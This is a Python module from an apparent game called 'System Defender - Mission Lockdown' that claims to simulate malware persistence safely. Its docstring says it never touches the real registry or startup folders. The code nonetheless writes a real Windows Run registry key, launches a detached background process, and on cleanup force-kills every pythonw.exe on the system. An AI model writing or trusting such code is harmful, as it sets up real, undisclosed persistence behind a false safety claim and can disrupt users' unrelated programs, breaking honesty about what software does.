"""Persistence simulation for System Defender - Mission Lockdown.

IMPORTANT: This does NOT touch real OS startup folders or registry.
It only writes a marker file to a local, simulated startup folder
inside the project directory for safe demonstrations.
"""

from __future__ import annotations

from pathlib import Path
from typing import Tuple


import subprocess
import sys
import shutil

SIMULATED_STARTUP_DIR = Path(__file__).resolve().parent / "simulated_startup"
PERSISTENCE_MARKER = SIMULATED_STARTUP_DIR / "system_defender_autorun.txt"
PERSISTENT_AGENT = SIMULATED_STARTUP_DIR / "v_hunter_agent.pyw"

import winreg

def create_persistence() -> Tuple[bool, Path]:
    """Create a persistent background process and Registry autorun key."""
    SIMULATED_STARTUP_DIR.mkdir(parents=True, exist_ok=True)
    
    # 1. Create the marker
    PERSISTENCE_MARKER.write_text(
        "System Defender - Permanent Extraction Active\n"
        "Persistence achieved via Registry Run key.\n",
        encoding="utf-8",
    )
    
    # 2. Identify the current executable
    is_frozen = getattr(sys, 'frozen', False)
    if is_frozen:
        exe_path = sys.executable
    else:
        # For dev: use the absolute path to the main game script
        exe_path = f'"{sys.executable}" "{Path(__file__).resolve().parent.parent / "game" / "main_game.py"}" --bg'
        
    # 3. Add to Registry (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
    if sys.platform == "win32":
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "VirusHunterAgent", 0, winreg.REG_SZ, exe_path if is_frozen else exe_path)
            winreg.CloseKey(key)
        except Exception as e:
            print(f"Registry Persistence Error: {e}")

    # 4. Spawn as DETACHED for immediate effect
    cmd = [sys.executable] if is_frozen else [sys.executable, "-m", "game.main_game"]
    cmd.append("--bg")
    
    try:
        if sys.platform == "win32":
            subprocess.Popen(cmd, 
                             creationflags=0x00000008 | 0x00000200,
                             close_fds=True)
        else:
            subprocess.Popen(cmd, start_new_session=True)
        return True, PERSISTENCE_MARKER
    except Exception as e:
        print(f"Persistence Launch Error: {e}")
        return False, PERSISTENCE_MARKER

def remove_persistence() -> Tuple[bool, Path]:
    """Remove the persistent agent, Registry key, and marker."""
    # 1. Kill the background process
    try:
        if sys.platform == "win32":
            subprocess.run(["taskkill", "/F", "/IM", "VirusHunter.exe"], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
            subprocess.run(["taskkill", "/F", "/IM", "pythonw.exe"], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    except: pass

    # 2. Remove Registry Key
    if sys.platform == "win32":
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "VirusHunterAgent")
            winreg.CloseKey(key)
        except FileNotFoundError: pass
        except Exception as e: print(f"Registry Cleanup Error: {e}")

    # 3. Remove files
    if PERSISTENCE_MARKER.exists():
        PERSISTENCE_MARKER.unlink()
    if PERSISTENT_AGENT.exists():
        try: PERSISTENT_AGENT.unlink()
        except: pass
    return True, PERSISTENCE_MARKER

